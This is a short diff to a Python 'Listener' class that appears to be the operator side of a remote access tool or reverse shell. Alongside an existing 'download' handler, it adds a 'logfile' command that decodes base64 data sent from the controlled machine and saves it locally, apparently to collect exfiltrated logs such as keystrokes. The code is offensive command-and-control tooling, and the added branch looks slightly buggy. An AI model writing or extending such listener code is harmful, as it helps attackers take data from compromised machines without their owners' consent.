@@ -85,6 +85,11 @@ class Listener:
 
                 if command[0] == "download" and isinstance(result, str) and "[-] Error" not in result:
                     result = self.write_file(command[1], result)
+                elif command[0] == "logfile":
+                    with open("received_log.txt", "wb") as log_file:
+                        log_file.write(base64.b64decode(result[1]))
+                    print("[+] Log file saved as received_log.txt")
+                    continue
             except Exception:
                 result = "[-] Error during command executionnnn" # If there is an error, print this message    
             
